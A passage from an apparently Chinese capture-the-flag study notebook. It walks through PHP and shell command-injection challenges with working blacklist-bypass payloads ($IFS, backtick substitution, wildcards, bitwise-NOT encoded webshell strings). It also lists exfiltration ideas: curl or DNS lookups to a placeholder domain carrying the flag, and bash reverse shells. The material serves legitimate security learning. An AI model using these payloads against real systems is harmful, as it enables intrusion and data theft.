+<p><strong>记法：<code>array_slice</code> 吃数组吐数组，<code>join</code> 吃数组吐字符串。</strong></p>
+<hr />
+<h2 id="_16">十、实战记录<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h2>
+<h3 id="101-ping-ping-ping">10.1 [Ping ping ping]（第一道）<a class="headerlink" href="#101-ping-ping-ping" title="Permanent link">&para;</a></h3>
+<p><strong>题目：输入 IP 做 ping 测试</strong></p>
+<p><strong>过程：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>① 测出空格被过滤
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>   127.0.0.1;id          → 没反应
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a>   127.0.0.1;id$IFS      → ?
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a>
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a>② 用 $IFS 绕过空格
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a>   ;ls                   → 看到 flag.php
+</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a>
+</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a>③ 关键词被拦
+</span><span id="__span-26-9"><a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a>   flag 被过滤           → cat flag.php 不行
+</span><span id="__span-26-10"><a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a>   / 和 /f* 也被过滤      → 路径也堵了
+</span><span id="__span-26-11"><a id="__codelineno-26-11" name="__codelineno-26-11" href="#__codelineno-26-11"></a>
+</span><span id="__span-26-12"><a id="__codelineno-26-12" name="__codelineno-26-12" href="#__codelineno-26-12"></a>④ 用命令替换绕过
+</span><span id="__span-26-13"><a id="__codelineno-26-13" name="__codelineno-26-13" href="#__codelineno-26-13"></a>   |cat$IFS`ls`          → 成功拿到 flag
+</span></code></pre></div>
+<p><strong>关键点：</strong></p>
+<table>
+<thead>
+<tr>
+<th>卡点</th>
+<th>绕法</th>
+<th>原理</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>空格被拦</td>
+<td><code>$IFS</code></td>
+<td>IFS 默认值含空格</td>
+</tr>
+<tr>
+<td><code>flag</code> 被拦</td>
+<td><code>`ls`</code></td>
+<td>不写 flag 字面量,让系统输出</td>
+</tr>
+<tr>
+<td><code>/</code> 和 <code>/f*</code> 被拦</td>
+<td><code>`ls`</code> 的输出</td>
+<td>路径里的 <code>/</code> 也不用手写</td>
+</tr>
+</tbody>
+</table>
+<p><strong><code>|cat$IFS\</code>ls`` 拆解：</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="p">|</span><span class="w">                     </span>管道,把左边输出给右边<span class="o">(</span>其实这里左边是空的<span class="o">)</span>
+</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>cat<span class="w">                   </span>要执行的命令
+</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a><span class="nv">$IFS</span><span class="w">                  </span>空格
+</span><span id="__span-27-4"><a id="__codelineno-27-4" name="__codelineno-27-4" href="#__codelineno-27-4"></a><span class="sb">`</span>ls<span class="sb">`</span><span class="w">                  </span>命令替换<span class="w"> </span>→<span class="w"> </span>得到<span class="w"> </span><span class="s2">"flag.php"</span>
+</span><span id="__span-27-5"><a id="__codelineno-27-5" name="__codelineno-27-5" href="#__codelineno-27-5"></a><span class="w">                      </span>↓
+</span><span id="__span-27-6"><a id="__codelineno-27-6" name="__codelineno-27-6" href="#__codelineno-27-6"></a>最终等价于:<span class="w">  </span>cat<span class="w"> </span>flag.php
+</span></code></pre></div>
+<p><strong>为什么用 <code>|</code> 不用 <code>;</code>：</strong></p>
+<p><strong>因为 <code>;</code> 后面如果被过滤规则识别出"新命令",可能被拦；而 <code>|</code> 把 <code>cat</code> 的输出接到管道,<code>cat</code> 本身看起来像"参数"的一部分。</strong></p>
+<p><strong>（具体哪种能过,取决于过滤规则的写法 —— 两个都试。）</strong></p>
+<h3 id="102-newstarctf-so-baby-rce-again">10.2 [NewStarCTF 公开赛] So Baby RCE Again（无回显）<a class="headerlink" href="#102-newstarctf-so-baby-rce-again" title="Permanent link">&para;</a></h3>
+<p><strong>题目：直接给了源码，只过滤 <code>bash</code> 和 <code>curl</code>；命令能执行但</strong>没有回显<strong>。</strong></p>
+<p><strong>过程：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>① 看源码 → 过滤 bash / curl → 但不能回显
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>② 用输出重定向把结果写进文件
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>   ?cmd=ls /&gt;1.txt
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>③ 访问 http://target/1.txt → 看到 flag 文件名
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a>④ 再写一次
+</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a>   ?cmd=cat /flag /&gt;1.txt
+</span><span id="__span-28-7"><a id="__codelineno-28-7" name="__codelineno-28-7" href="#__codelineno-28-7"></a>⑤ 访问 1.txt → 拿到 flag
+</span></code></pre></div>
+<p><strong>核心 payload：</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>?cmd<span class="o">=</span>ls<span class="w"> </span>/<span class="w"> </span>&gt;1.txt
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>?cmd<span class="o">=</span>cat<span class="w"> </span>/flag<span class="w"> </span>&gt;1.txt
+</span></code></pre></div>
+<p><strong>然后访问 <code>http://target/1.txt</code>。</strong></p>
+<p><strong>为什么这招有效：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>① 命令确实执行了(只是输出没返回给你)
+</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>② &gt; 把 stdout 写进文件
+</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>③ 文件落在【当前工作目录】(通常是网站根目录)
+</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>④ 这个目录能被 web 访问 → 直接下载
+</span></code></pre></div>
+<p><strong>两个关键细节：</strong></p>
+<table>
+<thead>
+<tr>
+<th>细节</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>文件落在 CWD</strong></td>
+<td>不是 <code>/</code>。<code>&gt;1.txt</code> 是相对路径，相对于执行脚本所在目录</td>
+</tr>
+<tr>
+<td><strong>只重定向 stdout</strong></td>
+<td>命令报错（stderr）不会进文件，要 <code>2&gt;&amp;1</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>先确认自己在哪：</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>?cmd<span class="o">=</span><span class="nb">pwd</span><span class="w"> </span>&gt;1.txt
+</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>?cmd<span class="o">=</span>ls<span class="w"> </span>-la<span class="w"> </span>&gt;1.txt
+</span></code></pre></div>
+<p><strong>知道 CWD 才能确定文件能不能被访问到。</strong></p>
+<p><strong>为什么这题只能写文件：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>bash 被过滤  →  不能 bash -i 反弹
+</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>curl 被过滤  →  不能 curl http://域名/$(cat /flag)
+</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>剩下能用的:
+</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a>  · 写文件(&gt; / cp / mv / tee)
+</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>  · DNS 外带(ping `cat /flag`.域名)
+</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a>  · wget 外带(通常没被过滤)
+</span></code></pre></div>
+<p><strong>写文件是最省事的一条 —— 前提是 web 根可写。</strong></p>
+<p><strong>这题的收获：</strong></p>
+<blockquote>
+<p><strong>"无回显"不等于"没办法" —— 只要还有一个"你能访问的目录",就能把输出搬出来。</strong></p>
+</blockquote>
+<hr />
+<h3 id="103-dest0g3-520-simplerceeval">10.3 [Dest0g3 520迎新赛] SimpleRCE（eval + 替换型黑名单）<a class="headerlink" href="#103-dest0g3-520-simplerceeval" title="Permanent link">&para;</a></h3>
+<p><strong>源码（题目直接给出）:</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="x">$aaa = $_POST['aaa'];</span>
+</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="x">$black_list = array('^','.','`','&gt;','&lt;','=','"','preg','&amp;','|','%0','popen',</span>
+</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a><span class="x">'char','decode','html','md5','{','}','post','get','file','ascii','eval',</span>
+</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="x">'replace','assert','exec','$','include','var','pastre','print','tail','sed',</span>
+</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="x">'pcre','flag','scan','decode','system','func','diff','ini_','passthru',</span>
+</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="x">'pcntl','proc_open','+','cat','tac','more','sort','log','current','\\',</span>
+</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a><span class="x">'cut','bash','nl','wget','vi','grep');</span>
+</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a><span class="x">$aaa = str_ireplace($black_list, "hacker", $aaa);</span>
+</span><span id="__span-33-9"><a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a><span class="x">eval($aaa);</span>
+</span></code></pre></div>
+<p><strong>两个关键判断:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>① eval() → 执行的是 PHP 代码,不是 shell 命令
+</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>② str_ireplace() → 命中就【替换成 hacker】,不是拦截
+</span></code></pre></div>
+<p><strong>所以：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>不能写 $       → 不能用变量
+</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>不能写 .       → 不能字符串拼接
+</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>不能写 flag    → 变成 hacker
+</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a>不能写 system  → 变成 hacker
+</span></code></pre></div>
+<p><strong>过程:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>① echo(12);                → 页面出 12,确认 eval 通
+</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a>② echo(join(glob('/*')));  → 列出根目录,发现 flag
+</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a>③ 但 flag 会被替换成 hacker,不能直接写 '/flag'
+</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a>④ 用位置:array_slice(glob('/*'),4,1) → ['/flag']
+</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a>⑤ join 成字符串 → show_source 读出来
+</span></code></pre></div>
+<p><strong>最终 payload:</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="x">show_source(join(array_slice(glob('/*'),4,1)));</span>
+</span></code></pre></div>
+<p><strong>每一步在绕什么:</strong></p>
+<table>
+<thead>
+<tr>
+<th>步骤</th>
+<th>绕的是</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>glob('/*')</code></td>
+<td>不知道文件名</td>
+</tr>
+<tr>
+<td><code>array_slice(...,4,1)</code></td>
+<td><code>flag</code> 这个词不能出现</td>
+</tr>
+<tr>
+<td><code>join(...)</code></td>
+<td><code>.</code> 被禁，不能拼接</td>
+</tr>
+<tr>
+<td><code>show_source(...)</code></td>
+<td><code>file_get_contents</code> 含 <code>file</code>，会被替换</td>
+</tr>
+</tbody>
+</table>
+<p><strong>踩的坑:</strong></p>
+<table>
+<thead>
+<tr>
+<th>坑</th>
+<th>现象</th>
+<th>原因</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>echo(12)</code> 没反应</td>
+<td>空白</td>
+<td><strong>eval 里语句必须带 <code>;</code></strong></td>
+</tr>
+<tr>
+<td><code>echo(glob('/*'))</code></td>
+<td>只输出 <code>Array</code></td>
+<td>echo 不能输出数组</td>
+</tr>
+<tr>
+<td><code>show_source('/f*')</code></td>
+<td>失败</td>
+<td>show_source 不展开通配符</td>
+</tr>
+<tr>
+<td><code>echo(';ls /')</code></td>
+<td>无反应</td>
+<td><code>;ls /</code> 不是合法 PHP</td>
+</tr>
+</tbody>
+</table>
+<p><strong>这题的收获:</strong></p>
+<blockquote>
+<p><strong>关键词被替换 ≠ 无解 —— 用「运行时拼接」把词造出来。</strong></p>
+<p><strong>名字被过滤 ≠ 无解 —— 用「位置」代替「名字」。</strong></p>
+</blockquote>
+<h3 id="104-newstarctf-so-baby-rce">10.4 [NewStarCTF 公开赛] So Baby RCE（子串型黑名单 + 无 <code>/</code>）<a class="headerlink" href="#104-newstarctf-so-baby-rce" title="Permanent link">&para;</a></h3>
+<p><strong>源码:</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="x">if(isset($_GET["cmd"])){</span>
+</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="x">    if(preg_match('/et|echo|cat|tac|base|sh|more|less|tail|vi|head|nl|env|fl|\||;|\^|\'|\]|"|&lt;|&gt;|`|\/| |\\\\|\*/i', $_GET["cmd"])){</span>
+</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="x">       echo "Don't Hack Me";</span>
+</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="x">    }else{</span>
+</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="x">        system($_GET["cmd"]);   // ← 命令注入,不是 eval</span>
+</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a><span class="x">    }</span>
+</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a><span class="x">}</span>
+</span></code></pre></div>
+<p><strong>先分类这个黑名单:</strong></p>
+<table>
+<thead>
+<tr>
+<th>类别</th>
+<th>被封</th>
+<th>后果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>命令名</strong></td>
+<td><code>cat</code> <code>tac</code> <code>head</code> <code>tail</code> <code>more</code> <code>less</code> <code>nl</code> <code>vi</code></td>
+<td>常见读文件命令全灭</td>
+</tr>
+<tr>
+<td><strong>子串</strong></td>
+<td><code>et</code> <code>sh</code> <code>fl</code> <code>base</code> <code>env</code></td>
+<td><strong><code>get</code>/<code>set</code>/<code>bash</code>/<code>flag</code>/<code>base64</code> 全被连坐</strong></td>
+</tr>
+<tr>
+<td><strong>路径</strong></td>
+<td><code>/</code></td>
+<td><strong>不能用绝对路径</strong></td>
+</tr>
+<tr>
+<td><strong>空白</strong></td>
+<td>空格</td>
+<td>必须用 <code>$IFS</code></td>
+</tr>
+<tr>
+<td><strong>分隔/重定向</strong></td>
+<td><code>\|</code> <code>;</code> <code>&lt;</code> <code>&gt;</code> <code>`</code></td>
+<td>只能靠 <code>&amp;&amp;</code></td>
+</tr>
+<tr>
+<td><strong>引号/通配</strong></td>
+<td><code>'</code> <code>"</code> <code>]</code> <code>\</code> <code>*</code> <code>^</code></td>
+<td>不能包字符串、不能用 <code>*</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>关键：它是</strong>子串匹配** —— 封 <code>et</code> 会连 <code>get</code>、<code>set</code>、<code>target</code> 一起封。**</p>
+<p><strong>过程:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>① ls                    → 当前目录是个没用文件
+</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>② cd$IFS..$IFS&amp;&amp;ls      → 一级一级往上爬(因为 / 被禁,只能相对路径)
+</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>③ 在根目录找到 flag
+</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>④ sort 或 grep 读内容
+</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a>⑤ 但 flag 这个词里含 fl → 被拦
+</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a>⑥ 用 ? 当通配符:fl?ag 或 ????????  → 绕过
+</span></code></pre></div>
+<p><strong>卡点与绕法:</strong></p>
+<table>
+<thead>
+<tr>
+<th>卡点</th>
+<th>绕法</th>
+<th>原理</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>空格被禁</strong></td>
+<td><code>$IFS</code></td>
+<td>IFS 默认含空格</td>
+</tr>
+<tr>
+<td><strong><code>/</code> 被禁</strong></td>
+<td><code>cd ..</code> 逐级爬</td>
+<td>相对路径不含 <code>/</code></td>
+</tr>
+<tr>
+<td><strong><code>\|</code> <code>;</code> 被禁</strong></td>
+<td><code>&amp;&amp;</code></td>
+<td>逻辑与还能串命令</td>
+</tr>
+<tr>
+<td><strong><code>*</code> 被禁</strong></td>
+<td><code>?</code></td>
+<td><strong><code>?</code> 没在黑名单里</strong></td>
+</tr>
+<tr>
+<td><strong><code>cat/head/tail</code> 被禁</strong></td>
+<td><code>sort</code> <code>grep</code> <code>uniq</code> <code>od</code> <code>strings</code> <code>awk</code> <code>sed</code></td>
+<td>读文件的替代品一大堆</td>
+</tr>
+<tr>
+<td><strong><code>fl</code> 被禁</strong></td>
+<td><code>fl?ag</code> / 一串 <code>?</code></td>
+<td>通配符替你补字符</td>
+</tr>
+</tbody>
+</table>
+<p><strong>哪些命令在这题能读文件:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>sort<span class="w"> </span>????<span class="w">            </span><span class="c1"># 排序(单行=原样)</span>
+</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>grep<span class="w"> </span>.<span class="w"> </span>????<span class="w">          </span><span class="c1"># 搜索(输出匹配行)</span>
+</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>uniq<span class="w"> </span>????<span class="w">            </span><span class="c1"># 去重</span>
+</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>od<span class="w"> </span>-c<span class="w"> </span>????<span class="w">           </span><span class="c1"># 字符转储</span>
+</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a>strings<span class="w"> </span>????<span class="w">         </span><span class="c1"># 提取可打印字符</span>
+</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a>rev<span class="w"> </span>????<span class="w">             </span><span class="c1"># 反转</span>
+</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a>awk<span class="w"> </span><span class="m">1</span><span class="w"> </span>????<span class="w">           </span><span class="c1"># 打印全部</span>
+</span></code></pre></div>
+<p><strong>关于 <code>{abc}</code> 当空字符:</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="nb">echo</span><span class="w"> </span>fl<span class="o">{</span>abc<span class="o">}</span>ag<span class="w">    </span>→<span class="w">  </span>fl<span class="o">{</span>abc<span class="o">}</span>ag<span class="w">     </span>←<span class="w"> </span>原样,不是<span class="w"> </span>flag
+</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="nb">echo</span><span class="w"> </span>fl<span class="o">{</span>,<span class="o">}</span>ag<span class="w">      </span>→<span class="w">  </span>flag<span class="w">          </span>←<span class="w"> </span>这才是空选项写法
+</span></code></pre></div>
+<p><strong>花括号展开只在 bash 下有效,<code>sh</code>(dash)不做。用它之前先 <code>echo</code> 验证。</strong>
+<strong>这题真正能过的是 <code>?</code> —— 因为 <code>*</code> 被封了,<code>?</code> 没被封。</strong></p>
+<p><strong>这题的收获:</strong></p>
+<blockquote>
+<p><strong>① 黑名单是子串匹配时,先找"哪些常用词被连坐"（et 封掉 get/set）。</strong></p>
+<p><strong>② <code>/</code> 被封不等于走不了 —— <code>cd ..</code> 用相对路径一样能爬到根目录。</strong></p>
+<p><strong>③ 读文件命令有十几个,封 8 个还剩 8 个。</strong></p>
+<p><strong>④ <code>*</code> 被封还有 <code>?</code> —— 通配符不止一种。</strong></p>
+</blockquote>
+<h3 id="105-2019-rce-me">10.5 [极客大挑战 2019] RCE ME（字母数字全封 + 按位取反）<a class="headerlink" href="#105-2019-rce-me" title="Permanent link">&para;</a></h3>
+<p><strong>题目：过滤掉所有字母和数字，<code>eval($code)</code> 只能吃符号。</strong></p>
+<p><strong>这就逼出一个核心技术：用</strong>按位取反<strong>把符号变成字母。</strong></p>
+<h4 id="_17">原理<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h4>
+<p><strong>PHP 对字符串做 <code>~</code> 是</strong>逐字节取反<strong>：</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="x">~"a"      →  0x9E（非打印字符）</span>
+</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="x">~"\x9E"   →  'a'   （反过来）</span>
+</span></code></pre></div>
+<p><strong>所以只要写出「目标字符串取反后的字节」，就能在运行时还原出任意单词。</strong></p>
+<p><strong>关键：这些字节经过 URL 编码后全是 <code>%xx</code>，不含任何字母数字 → 能过过滤。</strong></p>
+<h4 id="url">脚本：把字符串转成「取反 + URL 编码」<a class="headerlink" href="#url" title="Permanent link">&para;</a></h4>
+<div class="language-python highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">nt</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>    <span class="k">return</span> <span class="s1">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="s1">'</span><span class="si">%%%02x</span><span class="s1">'</span> <span class="o">%</span> <span class="p">(</span><span class="o">~</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">)</span>
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>
+</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="nb">print</span><span class="p">(</span><span class="n">nt</span><span class="p">(</span><span class="s2">"assert"</span><span class="p">))</span>    <span class="c1"># %9e%8c%8c%9a%8d%8b</span>
+</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="nb">print</span><span class="p">(</span><span class="n">nt</span><span class="p">(</span><span class="s2">"phpinfo"</span><span class="p">))</span>   <span class="c1"># %8f%97%8f%96%91%99%90</span>
+</span></code></pre></div>
+<p><strong>PowerShell 版：</strong></p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="k">function</span> <span class="n">nt</span><span class="p">(</span><span class="nv">$s</span><span class="p">)</span> <span class="p">{</span>
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>  <span class="n">-join</span> <span class="p">(</span><span class="nv">$s</span><span class="p">.</span><span class="n">ToCharArray</span><span class="p">()</span> <span class="p">|</span> <span class="k">ForEach</span><span class="n">-Object</span> <span class="p">{</span> <span class="s1">'%%{0:x2}'</span> <span class="o">-f</span> <span class="p">((</span><span class="o">-bnot</span> <span class="no">[int]</span><span class="nv">$_</span><span class="p">)</span> <span class="o">-band</span> <span class="n">0xFF</span><span class="p">)</span> <span class="p">})</span>
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="p">}</span>
+</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="n">nt</span> <span class="s2">"assert"</span>
+</span></code></pre></div>
+<h4 id="_18">常用对照表（已核验）<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>目标</th>
+<th>取反 + URL 编码</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>assert</code></td>
+<td><code>%9e%8c%8c%9a%8d%8b</code></td>
+</tr>
+<tr>
+<td><code>eval</code></td>
+<td><code>%9a%89%9e%93</code></td>
+</tr>
+<tr>
+<td><code>system</code></td>
+<td><code>%8c%86%8c%8b%9a%92</code></td>
+</tr>
+<tr>
+<td><code>phpinfo</code></td>
+<td><code>%8f%97%8f%96%91%99%90</code></td>
+</tr>
+<tr>
+<td><code>_POST</code></td>
+<td><code>%a0%af%b0%ac%ab</code></td>
+</tr>
+<tr>
+<td><code>cmd</code></td>
+<td><code>%9c%92%9b</code></td>
+</tr>
+</tbody>
+</table>
+<h4 id="payload">payload 模板<a class="headerlink" href="#payload" title="Permanent link">&para;</a></h4>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a><span class="x">$_=~"%9e%8c%8c%9a%8d%8b";      // $_ = "assert"</span>
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a><span class="x">$__=~"%a0%af%b0%ac%ab";        // $__ = "_POST"</span>
+</span><span id="__span-45-3"><a id="__codelineno-45-3" name="__codelineno-45-3" href="#__codelineno-45-3"></a><span class="x">$_(${$__}[~"%9c%92%9b"]);      // assert($_POST["cmd"])</span>
+</span></code></pre></div>
+<p><strong>逐段看：</strong></p>
